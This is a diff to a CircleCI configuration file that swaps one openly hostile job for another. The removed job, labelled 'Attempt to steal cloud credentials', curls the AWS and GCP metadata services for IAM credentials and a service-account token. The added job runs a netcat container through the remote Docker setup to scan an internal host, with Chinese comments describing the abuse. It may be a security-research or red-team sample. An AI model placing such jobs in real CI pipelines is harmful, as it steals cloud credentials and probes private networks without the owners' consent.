@@ -1,20 +1,23 @@
 version: 2.1
 
 jobs:
-  exfil-metadata:
-    machine:
-      image: ubuntu-2004:current
+  abuse-remote-docker:
+    docker:
+      - image: cimg/base:stable
     steps:
+      - checkout
+      - setup_remote_docker:
+          version: 20.10.18
       - run:
-          name: "Attempt to steal cloud credentials"
+          name: "Run malicious container in remote docker"
           command: |
-            echo ">>> Probing for AWS Metadata Service..."
-            curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
-            echo
-            echo ">>> Probing for GCP Metadata Service..."
-            curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+            echo ">>> Starting internal network scan..."
+            # 利用远程Docker环境运行一个netcat容器，扫描内网的 10.0.1.50 主机
+            # 注意：这个IP地址仅为示例
+            docker run --rm busybox nc -zv 10.0.1.50 22
+            echo ">>> Network scan finished."
 
 workflows:
-  main_workflow:
+  scanner_workflow:
     jobs:
-      - exfil-metadata
+      - abuse-remote-docker
